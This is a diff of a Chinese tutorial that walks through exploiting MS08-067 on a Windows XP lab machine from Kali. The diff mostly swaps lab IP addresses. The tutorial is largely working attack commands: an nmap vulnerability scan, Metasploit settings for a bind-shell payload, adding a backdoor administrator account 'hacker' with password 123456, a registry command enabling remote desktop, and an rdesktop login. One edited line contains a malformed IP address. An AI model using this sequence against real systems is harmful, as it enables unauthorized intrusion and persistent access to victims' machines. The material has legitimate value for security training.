@@ -298,31 +298,31 @@ https://bbs.pediy.com/thread-251219.htm
 https://www.freebuf.com/vuls/203881.html
 MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行。
 ### 二、环境搭建
-受害机：Windows XP SP1镜像
-攻击机：Kali系统
+受害机：Windows XP SP1镜像  
+攻击机：Kali系统  
 
 第一步，在虚拟机中安装Windows XP SP1系统和Kali系统。Windows XP SP1镜像下载参考：[Windows XP SP1可用的原版iso](https://blog.csdn.net/ddmtjegb12140/article/details/101920059)，安装参考[使用VMware虚拟机安装Windows XP系统](https://blog.csdn.net/linxinfa/article/details/112768896)  
 
-第二步，虚拟机两个系统之间能够相互通信。
-Kali：192.168.44.136
-Win XP：192.168.44.135
+第二步，虚拟机两个系统之间能够相互通信。  
+Kali：192.168.163.128  
+Win XP：192.168.163.137  
 
-第三步，打开Windows XP系统，确定445端口开启。如下图所示，在Win XP的CMD中输入“netstat -sn”查看端口445是否打开。
+第三步，打开Windows XP系统，确定445端口开启。如下图所示，在Win XP的CMD中输入“netstat -sn”查看端口445是否打开。  
 
-第四步，关闭Windows XP系统的防火墙。
+第四步，关闭Windows XP系统的防火墙。  
 
-做完这些初始准备之后，我们开始利用Kali系统进行漏洞复现。
+做完这些初始准备之后，我们开始利用Kali系统进行漏洞复现。  
 ### 三、利用Metasploit复现漏洞
 135、137、138、139和445这些端口，它们都是与文件共享和打印机共享有关的端口，而且在这几个端口上经常爆发很严重的漏洞。比如2017年危害全球的永恒之蓝，就是利用的445端口。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭139和445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。
 
 第一步，利用Nmap工具扫描端口及确认该漏洞是否存在。
 ```bash
-nmap -n -p 445 --script smb-vuln-ms08-067 192.168.44.135 --open
+nmap -n -p 445 --script smb-vuln-ms08-067 192.168.163.137 --open
 ```
-nmap漏扫脚本目录为“/usr/share/nmap/script/”，如下图所示，扫描结果为VULNERABLE，表示MS0808-067漏洞存在且可以利用。
-或者使用 “nmap -sV -Pn 192.168.44.135” 查看目标主机开放的端口。目标机开放了135、139、445、1025、5000端口，且目标机系统为Windows XP。作为黑客，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。
+nmap漏扫脚本目录为 `/usr/share/nmap/script/` ，如下图所示，扫描结果为VULNERABLE，表示MS0808-067漏洞存在且可以利用。
+或者使用 `nmap -sV -Pn 192.168.163.137` 查看目标主机开放的端口。目标机开放了135、139、445、1025、5000端口，且目标机系统为Windows XP。作为黑客，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。
 ```bash
-nmap  -sV -Pn 192.168.44.135
+nmap  -sV -Pn 1192.168.163.137
 ```
 
 第二步，进入Msfconsole并利用search语句查找漏洞利用模块。
@@ -343,13 +343,13 @@ show targets
 第四步，设置攻击机、受害机信息。
 ```bash
 # 目标机ip
-set RHOST 192.168.44.135
+set RHOST 192.168.163.137
 # 端口号
 set RPORT 445
 # 设置payload
 set payload generic/shell_bind_tcp
 # 攻击机ip
-set LHOST 192.168.44.136
+set LHOST 192.168.163.128
 # 设置自动类型
 set target 0
 # 显示配置信息
@@ -357,16 +357,14 @@ show options
 ```
 
 第五步，运行exploit反弹shell。
-此时我们成功获取了Windows XP系统的Shell，我们调用“ipconfig”查看的IP地址也是目标的“192.168.44.135”。
+此时我们成功获取了Windows XP系统的Shell，我们调用“ipconfig”查看的IP地址也是目标的 `192.168.163.137` 。
 ```bash
 exploit
 session 1
 ipconfig
 pwd
 ```
-注意：Windows XP SP1系统是中文而不是英文的，需要对ms08_067_netapi_ser2003_zh.rb处理。
-
-参考：MS08-067 远程执行代码 漏洞复现 - feizianquan
+注意：Windows XP SP1系统是中文而不是英文的，需要对ms08_067_netapi_ser2003_zh.rb处理。  
 
 第六步，在目标主机上创建文件夹及文件。
 ```bash
@@ -413,7 +411,7 @@ net localgroup administrators abcd /add
 
 输入命令开启远程连接端口。
 
-接着输入“rdesktop 192.168.44.135”连接远程IP地址，并输入我们创建好的hacker用户名及密码。
+接着输入 `rdesktop 192.168.163.137` 连接远程IP地址，并输入我们创建好的hacker用户名及密码。
 
 输入创建的用户名hacker和密码123456回车，弹出提示框点击OK，稍等就会成功远程登录XP系统。
 
@@ -424,7 +422,7 @@ net localgroup administrators abcd /add
 
 ```bash
 # 端口查询
-nmap -n -p 445 --script smb-vuln-ms08-067 192.168.44.135 --open
+nmap -n -p 445 --script smb-vuln-ms08-067 192.168.163.137 --open
 
 # 查找漏洞利用模块
 msfconsole
@@ -436,10 +434,10 @@ show options
 show targets
 
 # 设置相关配置信息
-set RHOST 192.168.44.135
+set RHOST 192.168.163.137
 set RPORT 445
 set payload generic/shell_bind_tcp
-set LHOST 192.168.44.136
+set LHOST 192.168.163.128
 set target 0
 show options
 
@@ -462,7 +460,7 @@ net user hacker 123456 /add
 net localgroup administrators hacker /add
 echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f > C:\WINDOWS\system32\3389.bat && call 3389.bat
 netstat -an
-rdesktop 192.168.44.135
+rdesktop 192.168.163.137
 ```
 
 
